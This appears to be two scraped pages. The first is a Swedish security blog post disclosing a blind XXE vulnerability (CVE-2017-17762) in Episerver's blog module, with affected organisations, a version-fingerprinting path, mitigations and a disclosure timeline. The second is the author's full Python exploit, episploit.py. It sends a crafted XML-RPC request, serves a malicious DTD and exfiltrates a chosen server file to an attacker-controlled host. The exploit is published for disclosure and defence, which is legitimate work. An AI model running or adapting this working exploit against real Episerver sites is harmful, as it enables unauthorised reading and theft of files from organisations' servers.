=== Content from kryptera.se_5e8eb870_20250124_124643.html ===


[![Cybersäkerhet och IT-säkerhet](https://kryptera.se/wp-content/uploads/2017/02/kryptera-liten3.png)](https://kryptera.se/ "Cybersäkerhet och IT-säkerhet")[Cybersäkerhet och IT-säkerhet](https://kryptera.se/ "Cybersäkerhet och IT-säkerhet")En blogg om cybersäkerhet av Jonas Lejon

* [Om](https://kryptera.se/om/)
* [Nyhetsbrev](https://kryptera.se/nyhetsbrev-om-it-sakerhet-och-kryptering/)
* [Kontakt](https://kryptera.se/kontakt/)
* [Twitter](https://twitter.com/kryptera)

2018-08-29
# Sårbarhet i Episerver

[Tweet](//twitter.com/share)

![Episploit - Klart Episerver sårbarheten ska ha en logo](https://kryptera.se/assets/uploads/2018/05/episploit-logo-1024x576.png)

För några månader sedan så upptäckte jag en sårbarhet i Episerver. Sårbarheten återfinnes i Episervers bloggmodul och är en så kallad blind (XXE) XML External Entity-sårbarhet. Jag rapporterade givetvis sårbarheten till företaget Episerver, och den finns åtgärdad från och med Episerver 7-patch 5.

Episerver används av mängder av företag och myndigheter såsom:

* Försvarets materielverk (FMV)
* Swedavia
* Interflora
* Vinnova
* Smittskyddsinstitutet
* Domstolsverket
* Trafikverket
* Myndigheten för samhällsskydd och beredskap, MSB

Buggen heter internt hos Episerver #128556 och jag har fått CVE registrerad som CVE-2017-17762.

Jag har även utvecklat en proof-of-concept kod i Python vid namn **episploit.py** som finns att hämta hem på [Github Gist](https://gist.github.com/jonaslejon/5f92779848360a1a1e676af0795bd9aa). Förutom att hämta hem en extern XML DTD som PoC:en jag har länkat, så går det även att detektera om en installation är sårbar genom att titta på DNS-förfrågningar ungefär som Burp Suite [Collaborator gör](https://portswigger.net/burp/help/collaborator). Att göra externa DNS-förfrågningar är effektivt eftersom många blockerar utgående TCP-anslutningar från sina webbservrar.

Det kan även vara möjligt att köra kod (Remote Code Execution, RCE) via en XXE. Se exempelvis [följande blogginlägg](https://zerosum0x0.blogspot.se/2016/05/xml-attack-for-c-remote-code-execution.html) där man använder sig av C#.

Och skärmdump som påvisar när en fil exfiltreras från en webbserver med hjälp av **episploit**:

![](https://kryptera.se/assets/uploads/2018/05/episploit.png)

Det är även möjligt att kontrollera huruvida en installation av Episerver är sårbar genom fingerprinting. Besök en sökväg som ser ut enligt följande:

* https://www.domännamn.se/util/xmlrpc/Handler.ashx

Och där finner du längst ner på sidan vilken version som används. Jag är inte helt hundra på hur versionsummer ska utläsas men tror att alla som har version EPiServer.Blog 7.0.586 EPiServer.XmlRpc 7.0.586 samt lägre versioner är sårbara.

## Åtgärder

Som en snabb åtgärd kan man blockera samtliga anrop till allt som börjar med en sökväg som är /util/xmlrpc. Även bör man blockera utgående trafik från webbservern och även DNS-förfrågningar.

Uppgradera till en senare version av Episerver och tyvärr så verkar det inte hjälpa att slå av bloggmodulen för denna bugg.

Tyvärr så listar inte Episerver säkerhetsuppdateringar på sin hemsida.

## Tidslinje för offentliggörande (disclosure timeline)

* 2017-12-12 Jag kontaktar CERT-SE som hänvisar till Episervers säkerhetschef
* 2017-12-13 Får kontakt med Episervers säkerhetschef som hänvisar vidare inom organisationen
* 2017-12-19 CVE-nummer reserveras
* 2017-12-21 Episervers VP R&D bekräftar sårbarheten samt meddelar att buggen heter internt #128556 och åtgärdad från och med Episerver 7-patch 5
* 2018-08-28 Info går ut till Kryptera.se-mailling-listan
* 2018-08-29 Detta inlägg publiceras

### *Relaterade*

![Jonas Lejon](/JonasLejon.png)

### Om Jonas Lejon

En av sveriges främsta experter inom cybersäkerhet med över 20 års erfarenhet. Frågor? Kontakta mig på: [[email protected]](/cdn-cgi/l/email-protection#09636667687a27627b70797d6c7b68497d7b606679277a6c) eller [![LinkedIn](https://kryptera.se/assets/themes/blaskan-child/img/linkedin.png)](http://se.linkedin.com/in/jonaslejon) [![Twitter](https://kryptera.se/assets/themes/blaskan-child/img/icon_twitter.png)](https://twitter.com/kryptera)

Taggad [blind XX](https://kryptera.se/t/blind-xx/), [CVE](https://kryptera.se/t/cve/), [Episerver](https://kryptera.se/t/episerver/), [Sårbarhet episerver](https://kryptera.se/t/sarbarhet-episerver/), [XML](https://kryptera.se/t/xml/), [XML DTD](https://kryptera.se/t/xml-dtd/), [XML External Entity](https://kryptera.se/t/xml-external-entity/), [XXE](https://kryptera.se/t/xxe/)

### Skriv en kommentar

Du måste vara [inloggad](https://kryptera.se/wp-login.php?redirect_to=%2Fsarbarhet-i-episerver%2F) för att skriva en kommentar.

 [Ny sårbarhet i IPSec](https://kryptera.se/ny-sarbarhet-i-ipsec/)
[Google släpper nytt krypto-bibliotek: Tink](https://kryptera.se/google-slapper-nytt-krypto-bibliotek-tink/)

### Sök

Sök efter:

### Populära inlägg

* [![Cybersäkerhet i Sverige 2024](https://i0.wp.com/kryptera.se/assets/uploads/myndigheter-1.png?resize=40%2C40&ssl=1)](https://kryptera.se/cybersakerhet-i-sverige-2024/ "Cybersäkerhet i Sverige 2024")
  [Cybersäkerhet i Sverige 2024](https://kryptera.se/cybersakerhet-i-sverige-2024/ "Cybersäkerhet i Sverige 2024")
* [![Allvarligaste sårbarheterna 2024](https://i0.wp.com/kryptera.se/assets/uploads/cwe_top_25_logo.png?resize=40%2C40&ssl=1)](https://kryptera.se/allvarligaste-sarbarheterna-2024/ "Allvarligaste sårbarheterna 2024")
  [Allvarligaste sårbarheterna 2024](https://kryptera.se/allvarligaste-sarbarheterna-2024/ "Allvarligaste sårbarheterna 2024")
* [![Nyhetsbrev om IT-säkerhet](https://i0.wp.com/kryptera.se/wp-content/uploads/2016/04/nyhetbrev.png?resize=40%2C40&ssl=1)](https://kryptera.se/nyhetsbrev-om-it-sakerhet-och-kryptering/ "Nyhetsbrev om IT-säkerhet")
  [Nyhetsbrev om IT-säkerhet](https://kryptera.se/nyhetsbrev-om-it-sakerhet-och-kryptering/ "Nyhetsbrev om IT-säkerhet")
* [![Cybersäkerhetstrender 2025](https://i0.wp.com/kryptera.se/assets/uploads/cybersecurity-trender-2025.png?resize=40%2C40&ssl=1)](https://kryptera.se/cybersakerhetstrender-2025/ "Cybersäkerhetstrender 2025")
  [Cybersäkerhetstrender 2025](https://kryptera.se/cybersakerhetstrender-2025/ "Cybersäkerhetstrender 2025")
* [![Nytt nationellt cybersäkerhetscenter](https://i0.wp.com/kryptera.se/assets/uploads/2019/12/myndigheter.png?resize=40%2C40&ssl=1)](https://kryptera.se/nytt-nationellt-cybersakerhetscenter/ "Nytt nationellt cybersäkerhetscenter")
  [Nytt nationellt cybersäkerhetscenter](https://kryptera.se/nytt-nationellt-cybersakerhetscenter/ "Nytt nationellt cybersäkerhetscenter")
### Taggar

[aes](https://kryptera.se/t/aes/)
[android](https://kryptera.se/t/android/)
[apple](https://kryptera.se/t/apple/)
[bakdörr](https://kryptera.se/t/bakdorr/)
[bitcoin](https://kryptera.se/t/bitcoin/)
[chrome](https://kryptera.se/t/chrome/)
[Cisco](https://kryptera.se/t/cisco/)
[dns](https://kryptera.se/t/dns/)
[facebook](https://kryptera.se/t/facebook/)
[firefox](https://kryptera.se/t/firefox/)
[FRA](https://kryptera.se/t/fra/)
[Försvarsmakten](https://kryptera.se/t/forsvarsmakten/)
[Github](https://kryptera.se/t/github/)
[google](https://kryptera.se/t/google/)
[https](https://kryptera.se/t/https/)
[iOS](https://kryptera.se/t/ios/)
[iphone](https://kryptera.se/t/iphone/)
[john the ripper](https://kryptera.se/t/john-the-ripper/)
[linux](https://kryptera.se/t/linux/)
[lösenord](https://kryptera.se/t/losenord/)
[md5](https://kryptera.se/t/md5/)
[microsoft](https://kryptera.se/t/microsoft/)
[MSB](https://kryptera.se/t/msb/)
[MUST](https://kryptera.se/t/must/)
[Myndigheten för samhällsskydd och beredskap](https://kryptera.se/t/myndigheten-for-samhallsskydd-och-beredskap/)
[nsa](https://kryptera.se/t/nsa/)
[openbsd](https://kryptera.se/t/openbsd/)
[openssh](https://kryptera.se/t/openssh/)
[openssl](https://kryptera.se/t/openssl/)
[pgp](https://kryptera.se/t/pgp/)
[ransomware](https://kryptera.se/t/ransomware/)
[rce](https://kryptera.se/t/rce/)
[rsa](https://kryptera.se/t/rsa/)
[ssl](https://kryptera.se/t/ssl/)
[Tails](https://kryptera.se/t/tails/)
[Threat Hunting](https://kryptera.se/t/threat-hunting/)
[tls](https://kryptera.se/t/tls/)
[tor](https://kryptera.se/t/tor/)
[Tor Browser](https://kryptera.se/t/tor-browser/)
[truecrypt](https://kryptera.se/t/truecrypt/)
[tvåfaktorsautentisering](https://kryptera.se/t/tvafaktorsautentisering/)
[twitter](https://kryptera.se/t/twitter/)
[vpn](https://kryptera.se/t/vpn/)
[windows](https://kryptera.se/t/windows/)
[wireshark](https://kryptera.se/t/wireshark/)

Licens CC-BY-4.0 [![Creative Commons License](https://i.creativecommons.org/l/by/4.0/80x15.png)](https://creativecommons.org/licenses/by/4.0/)
This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

![](https://www.facebook.com/tr?id=244214385777005&ev=NoScript)


=== Content from gist.github.com_79175f58_20250126_010958.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fjonaslejon%2F5f92779848360a1a1e676af0795bd9aa)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fjonaslejon%2F5f92779848360a1a1e676af0795bd9aa&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fjonaslejon%2F5f92779848360a1a1e676af0795bd9aa) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fjonaslejon%2F5f92779848360a1a1e676af0795bd9aa&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@jonaslejon](https://avatars.githubusercontent.com/u/190150?s=64&v=4)](/jonaslejon)

# [jonaslejon](/jonaslejon)/**[episploit.py](/jonaslejon/5f92779848360a1a1e676af0795bd9aa)**

Last active
October 5, 2020 01:00

Show Gist options

* [Download ZIP](/jonaslejon/5f92779848360a1a1e676af0795bd9aa/archive/c92f8bccb2497e490c1c1fa1e76109d3b3faafb9.zip)

* [Star
  1
  (1)](/login?return_to=https%3A%2F%2Fgist.github.com%2Fjonaslejon%2F5f92779848360a1a1e676af0795bd9aa)You must be signed in to star a gist
* [Fork
  1
  (1)](/login?return_to=https%3A%2F%2Fgist.github.com%2Fjonaslejon%2F5f92779848360a1a1e676af0795bd9aa)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/jonaslejon/5f92779848360a1a1e676af0795bd9aa.js&quot;&gt;&lt;/script&gt;
* Save jonaslejon/5f92779848360a1a1e676af0795bd9aa to your computer and use it in GitHub Desktop.

[Code](/jonaslejon/5f92779848360a1a1e676af0795bd9aa)
[Revisions
3](/jonaslejon/5f92779848360a1a1e676af0795bd9aa/revisions)
[Stars
1](/jonaslejon/5f92779848360a1a1e676af0795bd9aa/stargazers)
[Forks
1](/jonaslejon/5f92779848360a1a1e676af0795bd9aa/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/jonaslejon/5f92779848360a1a1e676af0795bd9aa.js&quot;&gt;&lt;/script&gt;

Save jonaslejon/5f92779848360a1a1e676af0795bd9aa to your computer and use it in GitHub Desktop.

[Download ZIP](/jonaslejon/5f92779848360a1a1e676af0795bd9aa/archive/c92f8bccb2497e490c1c1fa1e76109d3b3faafb9.zip)

Episerver XXE Vulnerability - Exploit Episploit

 [Raw](/jonaslejon/5f92779848360a1a1e676af0795bd9aa/raw/c92f8bccb2497e490c1c1fa1e76109d3b3faafb9/episploit.py)

[**episploit.py**](#file-episploit-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #!/usr/bin/python |
| --- | --- |
|  | ## |
|  | ## episploit.py - Blind XXE file read exploit for Episerver 7 patch 4 and below |
|  | ## |
|  | ## Starts a listening webserver, so the exploits needs a public IP and unfiltered port, configure RHOST below! |
|  | ## |
|  | ## Written by Jonas Lejon 2017-12-19 <jonas.xxe@triop.se> https://triop.se |
|  | ## Based on https://gist.github.com/mgeeky/7f45c82e8d3097cbbbb250e37bc68573 |
|  | ## |
|  | ## Usage: ./episploit.py <target> [file-to-read] |
|  | ## |
|  |  |
|  | from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer |
|  | import urllib |
|  | import re |
|  | import sys |
|  | import time |
|  | import threading |
|  | import socket |
|  |  |
|  | SERVER\_SOCKET = ('0.0.0.0', 8000) |
|  | EXFIL\_FILE = 'file:///c:/windows/win.ini' |
|  |  |
|  | # The public facing IP. Change this |
|  | RHOST = '1.2.3.4:' + str(SERVER\_SOCKET[1]) |
|  |  |
|  | EXFILTRATED\_EVENT = threading.Event() |
|  |  |
|  | class BlindXXEServer(BaseHTTPRequestHandler): |
|  |  |
|  | def response(self, \*\*data): |
|  | code = data.get('code', 200) |
|  | content\_type = data.get('content\_type', 'text/plain') |
|  | body = data.get('body', '') |
|  |  |
|  | self.send\_response(code) |
|  | self.send\_header('Content-Type', content\_type) |
|  | self.end\_headers() |
|  | self.wfile.write(body.encode('utf-8')) |
|  | self.wfile.close() |
|  |  |
|  | def do\_GET(self): |
|  | self.request\_handler(self) |
|  |  |
|  | def do\_POST(self): |
|  | self.request\_handler(self) |
|  |  |
|  | def log\_message(self, format, \*args): |
|  | return |
|  |  |
|  | def request\_handler(self, request): |
|  | global EXFILTRATED\_EVENT |
|  |  |
|  | path = urllib.unquote(request.path).decode('utf8') |
|  | m = re.search('\/\?exfil=(.\*)', path, re.MULTILINE) |
|  | if m and request.command.lower() == 'get': |
|  | data = path[len('/?exfil='):] |
|  | print 'Exfiltrated %s:' % EXFIL\_FILE |
|  | print '-' \* 30 |
|  | print urllib.unquote(data).decode('utf8') |
|  | print '-' \* 30 + '\n' |
|  | self.response(body='true') |
|  |  |
|  | EXFILTRATED\_EVENT.set() |
|  |  |
|  | elif request.path.endswith('.dtd'): |
|  | print 'Sending malicious DTD file.' |
|  | dtd = '''<!ENTITY %% param\_exfil SYSTEM "%(exfil\_file)s"> |
|  | <!ENTITY %% param\_request "<!ENTITY exfil SYSTEM 'http://%(exfil\_host)s/?exfil=%%param\_exfil;'>"> |
|  | %%param\_request;''' % {'exfil\_file' : EXFIL\_FILE, 'exfil\_host' : RHOST} |
|  |  |
|  | self.response(content\_type='text/xml', body=dtd) |
|  |  |
|  | else: |
|  | print '[INFO] %s %s' % (request.command, request.path) |
|  | self.response(body='false') |
|  |  |
|  | def send\_stage1(target): |
|  | content = '''<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://''' + RHOST + '''/test.dtd"><foo>&exfil;</foo>''' |
|  | payload = '''POST /util/xmlrpc/Handler.ashx?pageid=1023 HTTP/1.1 |
|  | Host: ''' + target + ''' |
|  | User-Agent: curl/7.54.0 |
|  | Accept: \*/\* |
|  | Content-Length: ''' + str(len(content)) + ''' |
|  | Content-Type: application/x-www-form-urlencoded |
|  | Connection: close |
|  |  |
|  | ''' + content |
|  |  |
|  | print "Sending payload.." |
|  | s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) |
|  | port = 80 |
|  | s.connect((target,port)) |
|  | s.send(payload) |
|  |  |
|  | def main(target): |
|  | server = HTTPServer(SERVER\_SOCKET, BlindXXEServer) |
|  | thread = threading.Thread(target=server.serve\_forever) |
|  | thread.daemon = True |
|  | thread.start() |
|  | send\_stage1(target) |
|  |  |
|  | while not EXFILTRATED\_EVENT.is\_set(): |
|  | pass |
|  |  |
|  | if \_\_name\_\_ == '\_\_main\_\_': |
|  | if len(sys.argv) > 1: |
|  | target = sys.argv[1] |
|  | if len(sys.argv) > 2: |
|  | EXFIL\_FILE = sys.argv[2] |
|  | main(target) |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fjonaslejon%2F5f92779848360a1a1e676af0795bd9aa)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


